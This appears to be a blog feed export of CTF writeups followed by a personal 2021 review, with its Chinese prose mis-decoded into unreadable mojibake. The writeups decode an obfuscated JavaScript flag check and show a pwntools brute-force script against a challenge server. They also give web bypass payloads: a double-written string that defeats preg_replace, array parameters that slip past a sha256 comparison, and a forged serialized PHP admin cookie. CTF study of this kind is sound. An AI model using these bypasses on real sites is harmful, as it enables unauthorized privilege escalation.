_0xb645=[&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;,&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;,&quot;\x64\x65\x6D\x6F&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];function myFunction()&#123;let _0xb729x2;let _0xb729x3=prompt(_0xb645[0],_0xb645[1]);switch(_0xb729x3)&#123;case _0xb645[3]:_0xb729x2= _0xb645[2];break;default:_0xb729x2= _0xb645[4]&#125;;document[_0xb645[7]](_0xb645[6])[_0xb645[5]]= _0xb729x2&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡½æ•°æ‹¼æ¥  ä¸ç”¨ç®¡ï¼Œç›´æ¥æŠŠæ‰€æœ‰çš„16è¿›åˆ¶æå‡ºæ¥ï¼Œè§£ä¸€ä¸‹å°±å‡ºäº†.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C\x64\x65\x6D\x6F\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205401207.png" alt="image-20220403205401207"></p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h3 id="Khaaaaaan"><a href="#Khaaaaaan" class="headerlink" title="Khaaaaaan!"></a>Khaaaaaan!</h3><p>å¼€å±€ä¸€å¼ å›¾ï¼Œæ˜¯å››ç§å›¾å½¢ç¼–ç </p><p>åˆ†åˆ«å¯¹åº”çš„æ˜¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205525043.png" alt="image-20220403205525043"></p><blockquote><p><a href="https://www.dcode.fr/symbols-ciphers">https://www.dcode.fr/symbols-ciphers</a><br>shctf{without_freedom_of_choice_there_is_no_creativity}</p></blockquote><h3 id="MobileInfantry"><a href="#MobileInfantry" class="headerlink" title="MobileInfantry"></a>MobileInfantry</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def len_check(pad):</span></span><br><span class="line"><span class="comment">#     if len(pad) != 38:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 38ä½ï¼Œ</span></span><br><span class="line"><span class="comment"># def check1(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)+1):</span></span><br><span class="line"><span class="comment">#         if not pad[i].isupper():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># isupper():å¤§å†™ï¼Œ1-20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def check2(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)):</span></span><br><span class="line"><span class="comment">#         if not pad[i].islower():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># islower():å°å†™ï¼Œ21-38</span></span><br><span class="line"><span class="comment"># def check3(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])-1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># 1-19  ABCDEFGHIJKLMNOPQRSTaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkjihgfedcba</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkji</span></span><br><span class="line"><span class="comment"># def check4(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)-1):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])+1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTzyxwvutsrqponmlkji</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">strqian = <span class="string">&quot;ABCDEFGHIJKLMNOPQRST&quot;</span></span><br><span class="line">strhou = <span class="string">&quot;zyxwvutsrqponmlkji&quot;</span></span><br><span class="line">listqian = []</span><br><span class="line">listhou = []</span><br><span class="line"><span class="comment">#å¾ªç¯å‡ºæ‰€æœ‰å‰ç¼€listqian</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strqian:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listqian.append(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(listqian)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾ªç¯å‡ºæ‰€æœ‰åç¼€listhou</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strhou:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listhou.append(s)</span><br><span class="line"><span class="comment">#print(listhou)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        sendstr = listqian[i]+listhou[j]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">27602</span>)</span><br><span class="line">            io.sendline(sendstr)</span><br><span class="line">            a = io.recvall()</span><br><span class="line">            <span class="comment"># io.recvuntil(&quot;[+]&quot;,)</span></span><br><span class="line">            <span class="comment"># a = io.recvuntil(&quot;.&quot;,)</span></span><br><span class="line">            <span class="comment">#print(a.encode())</span></span><br><span class="line">            <span class="comment">#if &quot;&#123;&quot; in str(a) or &quot;&#125;&quot; in str(a):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(a):</span><br><span class="line">                <span class="built_in">print</span>(sendstr)</span><br><span class="line">                <span class="comment">#io.interactive()</span></span><br><span class="line">                <span class="built_in">print</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> baopo </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 RITSEC CTF éƒ¨åˆ†writeup</title>
      <link href="/2022/04/02/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2022/04/02/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h3><p>è€ƒç‚¹ï¼šåŒå†™ç»•è¿‡preg_replace</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];</span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;</span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">      output_flag();</span><br></pre></td></tr></table></figure><p>$clean_string = preg_replace(â€œ/$to_replace/â€œ, â€˜â€™, $input);<br>å…³é”®ä»£ç ï¼Œgetä¼ å‚ä¸€ä¸ªbingusï¼Œç”±äºpreg_replaceä¼šæŠŠä¸€ä¸ªbingusæ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯ä¸‹é¢åˆè¦ç­‰äºbingusï¼Œæˆ‘ä»¬å¯ä»¥åŒå†™<code>bingbingusus</code><br><img src="/images/2022-RITSEC-CTF/1.png" alt="image-20220402162035760"></p><h3 id="Pretty-Horrible-Program-3"><a href="#Pretty-Horrible-Program-3" class="headerlink" title="Pretty Horrible Program 3"></a>Pretty Horrible Program 3</h3><p>è€ƒç‚¹ï¼šhashå¼ºç¢°æ’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Nice try, but it won\&#x27;t be that easy ;)&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) === hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Your inputs don\&#x27;t match&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è¾“å…¥input1å’Œinput2ï¼Œå¹¶ä¸”1ä¸2ä¸èƒ½ç›¸åŒï¼Œä½†æ˜¯ä»–ä»¬çš„sha256è¦ç›¸åŒå¯ä»¥è¿™æ ·ç»•è¿‡<br><code>input1[]=1&amp;input2[]=2</code></p><p><img src="/images/2022-RITSEC-CTF/2.png" alt="image-20220402164521180"></p><h3 id="Pretty-Horrible-Program-2"><a href="#Pretty-Horrible-Program-2" class="headerlink" title="Pretty Horrible Program 2"></a>Pretty Horrible Program 2</h3><p>è€ƒç‚¹ï¼šç®€å•phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//public $role = &#x27;User&#x27;;</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$role</span>=<span class="string">&quot;Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function is_admin()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     return true;</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     return false;</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __sleep()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   return array($this-&gt;role);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;<span class="comment">//O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</span></span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œcookie çš„roleå¿…é¡»è¦æ˜¯admin,æ‰€ä»¥æˆ‘ä»¬æŠŠUseræ¢æˆadminï¼Œå…¶ä»–æ³¨é‡Šæ‰ï¼Œè¾“å‡ºå°±å¯ä»¥äº†<br>ç”±äºæˆ‘ä»¬è¿™é‡Œæ˜¯post å’Œ cookieæäº¤ ï¼Œè¦æ³¨æ„ç¼–ç é—®é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥urlencodeï¼Œæäº¤å°±å¯ä»¥äº†</p><p><img src="/images/2022-RITSEC-CTF/3.png" alt="image-20220402181841597"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> hashç¢°æ’ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my2021</title>
      <link href="/2022/01/31/my2021/"/>
      <url>/2022/01/31/my2021/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œæ–°å¹´åˆ°å•¦ï¼Œå…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹å•¦ï¼<br>å¾ˆå¿«ï¼Œ2021å¹´å·²ç»è¿‡å»äº†ï¼Œæ„Ÿè§‰è¿˜æ²¡å­¦åˆ°ä»€ä¹ˆæ—¶é—´å°±å¾ˆå¿«çš„è¿‡å»äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æœ‰æŠŠæ¡å¥½æ—¶é—´å§ã€‚ä¸€å¹´ç¡®å®ä¹Ÿè®¤è¯†äº†å¥½å¤šå¥½å¤šçš„äººï¼Œä¹Ÿç»å†äº†å¥½å¤šå¥½å¤šçš„äº‹æƒ…ï¼Œåœ¨æ­¤ä¹Ÿè®°å½•ä¸‹2021å¹´æ‰€å‘ç”Ÿæœ‰è¶£ä¸”æœ‰æ„ä¹‰çš„äº‹æƒ…å§ã€‚</p><p><img src="/images/my2021/1.png" alt="image-20220130142802861"></p><p>ä¸€äºŒä¸‰æœˆä»½éƒ½åœ¨å‡†å¤‡è€ƒè¯•ï¼Œæœ€åä¸ç®¡æ€ä¹ˆæ ·å§ï¼Œè€ƒä¸Šäº†ï¼Œè¿˜æ˜¯æŒºé«˜å…´çš„ã€‚</p><p>äº”æœˆä»½ï¼Œé¦–å…ˆåœ¨è¿˜æ˜¯è¦æ„Ÿè°¢æ¾³å“¥å¸¦æˆ‘æ‰“è¿›é“äººæ€»å†³èµ›å§ï¼Œäººç”Ÿä¸­ç¬¬ä¸€æ¬¡åœ¨è¿™ä¹ˆå¤§çš„èˆå°ä¸Šï¼Œå’Œä¼—å¤šé«˜æ ¡çš„å°ä¼™ä¼´ä¸€èµ·æ‰“æ¯”èµ›ï¼ŒçœŸçš„æ˜¯å¤ªå¼ºäº†ï¼Œæ„Ÿå—é¢‡å¤šã€‚æ‰“æ¯”èµ›å¾ˆç´¯ï¼Œåšä¸å‡ºé¢˜æ¥ï¼Œæ›´ç´¯ã€‚è¿˜æ˜¯é‚£å¥è¯äººå¤–æœ‰äººï¼Œå¤©å¤–æœ‰å¤©ï¼Œå¼ºçš„äººçœŸæ˜¯å¤ªå¤šäº†ï¼Œä¸åŠªåŠ›çš„è¯ï¼ŒçœŸçš„å•¥ä¹Ÿä¸æ˜¯ã€‚è®°å½•ä¸€ä¸‹å‚èµ›è¿‡ç¨‹å§ï¼Œè´´ä¸¤å¼ ç…§ç‰‡ã€‚æ„Ÿè°¢æ¾³å“¥ã€‚<img src="/images/my2021/2.png" alt="image-20220130144246418"></p><p><img src="/images/my2021/3.png" alt="image-20220130144314957"></p><p><img src="/images/my2021/4.png" alt="image-20220130144329029"></p><p><img src="/images/my2021/5.png" alt="image-20220130144830848"></p><p>äº”æœˆä»½ä½œä¸ºç‰¹é‚€æˆ˜é˜Ÿå‚åŠ äº†æ´¥é—¨æ¯ï¼Œæ„Ÿè°¢å¼ è€å¸ˆå¯¹æˆ‘çš„ä¿¡ä»»ï¼Œè®©æˆ‘å¸¦é˜Ÿï¼Œå¸¦å­¦å¼Ÿå’Œå­¦å¦¹å‚åŠ æ¯”èµ›ï¼ŒçœŸæ˜¯åˆ°äº†èµ›åœºä¸Šæ‰çŸ¥é“è‡ªå·±æœ‰å¤šèœï¼Œååœ¨ç”µè„‘å‰å°±å¾ˆç´§å¼ ï¼Œä¸€ä¼šå¹²è¿™ï¼Œä¸€ä¼šå¹²é‚£ï¼Œæ‰‹å¿™è„šä¹±çš„ï¼Œæœ€ä¸»è¦çš„åŸå› è¿˜æ˜¯è„‘å­é‡Œæ²¡æœ‰é‚£ä¹ˆå¤šä¸œè¥¿å§ï¼Œé‚£äº›é«˜æ ¡æˆ˜é˜ŸçœŸçš„å¤ªå¼ºäº†ï¼Œè¢«æ‰“çš„å¾ˆæƒ¨ã€‚ä¸è¿‡ï¼Œæœ€åä¹Ÿæœ‰å¹¸ä¹Ÿå»äº†ä¸–ç•Œæ™ºèƒ½å¤§ä¼šï¼Œè™½ç„¶æ²¡å¬æ‡‚å§ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯è£…å¬æ‡‚äº†å§ã€‚è´´ä¸¤å¼ ç…§ç‰‡è®°å½•ä¸€ä¸‹å§ã€‚æ„Ÿè°¢å¼ è€å¸ˆå’Œå­¦å¼Ÿå­¦å¦¹ã€‚</p><p><img src="/images/my2021/6.png" alt="image-20220130145559697"></p><p><img src="/images/my2021/7.png" alt="image-20220130145615187"></p><p><img src="/images/my2021/8.png" alt="image-20220130145623269"></p><p><img src="/images/my2021/9.png" alt="image-20220130145635833"></p><p><img src="/images/my2021/10.png" alt="image-20220130145713244"></p><p><img src="/images/my2021/11.png" alt="image-20220130150437476"></p><p>å…­æœˆåº•ä¸ƒæœˆåˆä¹Ÿä¸ºå›½å®¶åšäº†ä¸€äº›è´¡çŒ®å§ã€‚å½“ç„¶ä¹Ÿç»™è‡ªå·±å¢åŠ æŠ€æœ¯å’Œç»éªŒä»¥åŠå±¥å†äº†ã€‚æ„Ÿè°¢ç»³å“¥ã€‚</p><p>ä¹æœˆä»½ç¬¬ä¸€æ¬¡ç«™åœ¨è¿™ä¹ˆå¤§çš„èˆå°ä¸Šæ¼”è®²ï¼Œå¾ˆç´§å¼ ï¼Œä¹Ÿå¾ˆæœŸå¾…ã€‚æ€»ä½“æ¥è¯´è¿˜ç®—æˆåŠŸå§ï¼Œæ„Ÿè°¢å°ä¼™ä¼´å¸®æˆ‘æ‹çš„ç…§ï¼Œè´´ä¸€å¼ å§ã€‚æ‰“ç æ‰“ç ã€‚</p><p><img src="/images/my2021/12.png" alt="image-20220130163040609"></p><p>åæœˆä»½ã€‚æ„Ÿè°¢äºè€å¸ˆã€‚è®©æˆ‘èƒ½æœ‰ä¸€æ¬¡é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚</p><p>åä¸€æœˆä»½ä¹Ÿå»äº†æµ·æ²³å·¥åŒ æ¯ï¼Œæˆç»©ä¸­è§„ä¸­çŸ©å§ï¼Œè¯ä¹¦å°±ä¸è´´äº†ï¼Œä¹Ÿæ²¡å•¥æ„æ€ã€‚ä¸è¿‡é‚£å¤©èµ·çš„éå¸¸æ—©ï¼Œé›ªéå¸¸å¤§ï¼Œé£éå¸¸å¤§ï¼Œè·¯éå¸¸æ»‘ï¼Œå¤©ä¹Ÿè´¼å†·ã€‚</p><p>è¿˜æœ‰å¤©æ´¥å¸‚èµ›ï¼Œç¬¬ä¸€æ¬¡å‚åŠ ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œæ²¡æœ‰æ‹¿åˆ°åæ¬¡ï¼Œæ„§ç–šäº†å¥½ä¹…ï¼Œè¾œè´Ÿäº†è¥¿æ™®è€å¸ˆå¯¹æˆ‘çš„æœŸæœ›ï¼Œå“ï¼Œè°ä¹Ÿä¸æ€ªï¼Œåªèƒ½è¯´å‡†å¤‡çš„ä¸å……åˆ†ã€‚äººå®¶æ¯”æˆ‘ä»¬å‡†å¤‡çš„å¤šï¼Œå“ï¼Œæ²¡åŠæ³•ï¼Œæ€»ç»“æ•™è®­ï¼Œç»§ç»­åŠªåŠ›å§ã€‚æ„Ÿè°¢è¥¿æ™®çš„è€å¸ˆï¼Œæ„Ÿè°¢æˆ‘çš„å°ä¼™ä¼´ä»¬ã€‚</p><p>æ„Ÿè°¢é™ˆè€å¸ˆçš„é”®ç›˜å’Œé¼ æ ‡ã€‚</p><p>æ„Ÿè°¢éƒ­è€å¸ˆå¯¹æˆ‘çš„ä¿¡ä»»ã€‚è®©æˆ‘èƒ½æœ‰ä¸€æ¬¡é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚</p><p>åé¢å°±æ˜¯éå¸¸å¹¸è¿çš„è¿›å…¥äº†è¥¿æ™®è¿™ä¸ªå¤§å®¶åº­å§ï¼Œè®¤è¯†äº†è®¸å¤šå¯çˆ±çš„å°ä¼™ä¼´ï¼Œå’Œå‰å®³çš„è€å¸ˆã€‚å¸Œæœ›èƒ½åœ¨è¿™é‡Œä¸æµªè´¹æ—¶é—´ï¼Œå­¦ä¹ åˆ°æ›´å¤šçŸ¥è¯†å§ã€‚æ„Ÿè°¢è¥¿æ™®çš„è€å¸ˆã€‚</p><p>æ„Ÿè°¢å‡¡å“¥å¯¹æˆ‘çš„ä¿¡ä»»ã€‚æˆ‘å°½åŠ›ã€‚</p><p>æ„Ÿè°¢çˆ¶æ¯ã€‚</p><p>ä»Šå¹´ä¹Ÿé‡åˆ°äº†è®¸å¤šå¯çˆ±çš„å°ä¼™ä¼´ï¼Œå’Œå‰å®³çš„å¸ˆå‚…ï¼Œå­¦åˆ°äº†å¾ˆå¤šä»¥å‰æ²¡æœ‰è§è¿‡çš„ä¸œè¥¿ã€‚ä»Šå¹´ä¹Ÿæµªè´¹äº†å¥½å¤šçš„æ—¶é—´æ”¾åœ¨è‡ªå·±ä¸å–œæ¬¢çš„äº‹æƒ…ä¸Šï¼Œæ˜å¹´æˆ–è®¸ä¹Ÿä¼šèŠ±è®¸å¤šæ—¶é—´æ”¾åœ¨è‡ªå·±ä¸å–œæ¬¢çš„åœ°æ–¹ï¼Œå“æ²¡åŠæ³•ï¼Œè°è®©è‡ªå·±èµ·ç‚¹ä½å‘¢ã€‚åŠ æ²¹å§ï¼</p><p>å¥½ä¹…å¥½ä¹…ä»¥å‰å°±æœ‰äº†è¿™ä¸ªåšå®¢ï¼Œä½†æ˜¯ç”±äºå„ç§å„æ ·çš„åŸå› å§ï¼Œéƒ½æ²¡æœ‰åŠæ—¶çš„æ›´æ–°æ–‡ç« 